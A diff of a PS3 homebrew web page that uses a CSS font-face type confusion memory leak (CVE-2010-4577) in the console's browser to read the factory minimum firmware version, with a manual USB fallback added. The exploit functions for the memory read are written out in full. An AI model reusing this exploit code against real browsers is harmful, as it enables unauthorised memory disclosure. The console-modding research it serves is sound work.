@@ -9,29 +9,39 @@
         h1 { color: #dc3545; }
         #status { color: #f79452; margin: 20px 0; }
         #result { font-weight: bold; font-size: 1.2em; margin-top: 20px; }
+        #fallback { display: none; margin-top: 20px; padding: 15px; background: #333; border-radius: 4px; text-align: left; }
+        a { color: #dc3545; }
     </style>
 </head>
 <body>
     <div class="box">
         <h1>Factory Minimum Firmware Version Detector</h1>
-        <div id="status">Initialising memory leak exploit...</div>
+        <div id="status">Checking system compatibility…</div>
         <div id="result"></div>
-        <p style="color:#aaa; font-size:0.9em;">Uses CSS font face type confusion (CVE-2010-4577) memory leak.<br>Works on PS3 OFW 4.75–4.92 and HFW.</p>
+        <div id="fallback">
+            <strong style="color:#ffa500;">⚠️ The memory leak could not be performed.</strong><br><br>
+            <span>This is expected on official firmware (OFW) 4.83 and later, or if the browser
+            does not support the required CSS font face type confusion (CVE‑2010‑4577).</span><br><br>
+            <span>To find your console's exact factory minimum firmware version, use this reliable manual method:</span><br><br>
+            <span style="color:#f79452;">
+                1. Download <a href="https://archive.midnightchannel.net/SonyPS/Firmware/download/bb39828156bc7df144e4d06d81c801ab/MINVERCHK.PUP" target="_blank">MINVERCHK.PUP</a>.<br>
+                2. On a FAT32 USB drive, create the folders <code>PS3/UPDATE/</code> and place the file inside, renaming it to <code>PS3UPDAT.PUP</code>.<br>
+                3. Insert the USB into your PS3 and go to <strong>Settings → System Update → Update via Storage Media</strong>.<br>
+                4. The update will <strong>fail</strong> and show a message like: <em>"Update data of version 3.40 or later can be installed on this system."</em><br><br>
+                The number shown (e.g. <strong>3.40</strong>) is your console's factory minimum firmware!
+            </span>
+        </div>
     </div>
 
-    <!-- Hidden exploit element for CSS memory leak -->
+    <!-- Hidden element required for the CSS font face type confusion -->
     <div id="exploit" style="display:none;"></div>
 
     <script>
-    // ==================== MEMORY LEAK EXPLOIT (CSS Font Face Type Confusion) ====================
-    // Based on Zerosense MemoryReader.js by GHzGangster
-    // Exploit: CVE-2010-4577 – CSSParser::parseFontFaceSrc type confusion
+    // ==================== MEMORY LEAK EXPLOIT ====================
+    // Based on the Zerosense exploit library (CSS font face type confusion, CVE‑2010‑4577)
+    // This is a READ‑ONLY leak – no ROP execution is needed.
 
-    var exploitElement = document.getElementById('exploit');
-    var statusElement = document.getElementById('status');
-    var resultElement = document.getElementById('result');
-
-    // IEEE 754 double-precision conversion (required for the float overflow trick)
+    // IEEE 754 conversion helpers
     Number.prototype.noExponents = function() {
         var data = String(this).split(/[eE]/);
         if (data.length === 1) return data[0];
@@ -75,55 +85,45 @@
         return fromIEEE754(hex, 11, 52);
     }
 
-    // Convert address and size to the double that triggers the CSS font face type confusion
     function floatOverflow(address, size) {
         var n = (address * 0x100000000) + ((size >> 1) - 1);
         return generateIEEE754(address, (n - address));
     }
 
-    // Read arbitrary PS3 memory using the CSS font face type confusion
-    function readMemory(address, size) {
-        if (!exploitElement) return null;
+    // Main memory leak function – returns a string of raw bytes (size bytes)
+    function readMemoryLeak(address, size) {
+        var el = document.getElementById('exploit');
+        if (!el) return null;
 
-        var readAddress = address;
-        var readSize = size + 4;
-        var alignment = null;
-
-        // Find appropriate alignment
-        for (var align = 0x400; align <= 0x20000; align *= 2) {
-            var maxRead = align * 2;
-            var rem = readAddress % align;
-            var requiredRead = readSize + rem;
-            if (maxRead > requiredRead) {
-                alignment = align;
+        // Find alignment (as in Zerosense)
+        var align;
+        for (align = 0x400; align <= 0x20000; align *= 2) {
+            if (align * 2 > size + (address % align)) {
                 break;
             }
         }
-
-        if (alignment === null) {
-            statusElement.innerHTML = 'Error: Could not get required alignment';
+        if (align > 0x20000) {
+            document.getElementById('status').innerHTML = 'Error: Could not find memory alignment.';
             return null;
         }
 
-        var rem = readAddress % alignment;
-        if (rem !== 0) { readAddress -= rem; }
-        readSize = alignment * 2;
+        var readAddr = address - (address % align);
+        var readSize = align * 2;
 
         // Trigger the CSS font face type confusion
-        exploitElement.style.src = 'local(' + floatOverflow(readAddress, readSize) + ')';
+        var floatVal = floatOverflow(readAddr, readSize);
+        el.style.src = 'local(' + floatVal + ')';
 
         // Extract the leaked data
-        var str = exploitElement.style.src.substr(6 + (address - readAddress) / 2, size / 2);
+        var leaked = el.style.src.substr(6 + (address - readAddr) / 2, size / 2);
 
-        if (str === null || str.length < size / 2) {
-            statusElement.innerHTML = 'Memory read failed – may not be on a compatible PS3';
+        if (!leaked || leaked.length < size / 2) {
+            document.getElementById('status').innerHTML = 'Memory leak failed – exploit may be patched on this firmware.';
             return null;
         }
-
-        return str;
+        return leaked;
     }
 
-    // Convert binary string to hex representation
     function s2hex(str) {
         var hex = [];
         for (var i = 0; i < str.length; i++) {
@@ -132,43 +132,48 @@
         return hex.join('');
     }
 
-    // Read factory minimum firmware from PS3 flash memory
-    function readFactoryMinVer() {
-        statusElement.innerHTML = 'Reading factory minimum firmware from 0x8B000000...';
+    // Read factory minimum firmware version from PS3 flash memory
+    function detectMinVer() {
+        var statusEl = document.getElementById('status');
+        var resultEl = document.getElementById('result');
+        var fallbackEl = document.getElementById('fallback');
 
-        // The factory minimum firmware is stored at 0x8B000000 - 0x8
-        // Read 0x100 bytes and extract the version
-        var raw = readMemory(0x8B000000 - 0x8, 0x100);
+        // Address where the factory min version is stored (same as Flash Writer)
+        var address = 0x8B000000 - 0x8; // 0x8AFFFFF8
+        var size = 0x100;               // read 256 bytes
+
+        statusEl.innerHTML = 'Reading factory minimum firmware version…';
+        var raw = readMemoryLeak(address, size);
 
         if (!raw) {
-            statusElement.innerHTML = 'Memory read failed. Your firmware may not support this exploit.';
+            fallbackEl.style.display = 'block';
+            statusEl.innerHTML = 'Exploit did not succeed.';
             return;
         }
 
-        // Extract the version (same logic as Flash Writer's minVer())
-        var minver = s2hex(raw).toString().slice(3, 8).replace('00', '.');
+        // Extract the version using the same logic as Flash Writer's minVer()
+        var minVerRaw = raw.substr(10, 10);   // take 10 chars starting at offset 10
+        var hex = s2hex(minVerRaw);
+        var minver = hex.slice(3, 8).replace('00', '.');
 
         if (parseFloat(minver) > 3.56) {
-            resultElement.innerHTML = '<span style="color:red">Factory Minimum Firmware: ' + minver + ' (NOT CFW compatible)</span>';
+            resultEl.innerHTML = '<span style="color:red">Factory Minimum Firmware: ' + minver + ' (NOT CFW compatible)</span>';
         } else {
-            resultElement.innerHTML = '<span style="color:lightgreen">Factory Minimum Firmware: ' + minver + ' (CFW compatible)</span>';
+            resultEl.innerHTML = '<span style="color:lightgreen">Factory Minimum Firmware: ' + minver + ' (CFW compatible)</span>';
         }
-
-        statusElement.innerHTML = 'Detection complete.';
+        statusEl.innerHTML = 'Detection complete.';
     }
 
-    // Auto-start when page loads
+    // Start when the page is ready
     window.onload = function() {
         var ua = navigator.userAgent;
-        var isPS3 = ua.indexOf('PLAYSTATION 3') !== -1;
-
-        if (!isPS3) {
-            statusElement.innerHTML = 'Not on a PS3. This exploit only works on a real PlayStation 3.';
+        if (ua.indexOf('PLAYSTATION 3') === -1) {
+            document.getElementById('status').innerHTML = 'Not a PlayStation 3. This tool only works on a PS3 browser.';
             return;
         }
 
-        // Brief delay to ensure the page is fully loaded
-        setTimeout(readFactoryMinVer, 1000);
+        // Short delay to ensure the page is fully loaded and the exploit element exists
+        setTimeout(detectMinVer, 500);
     };
     </script>
 </body>
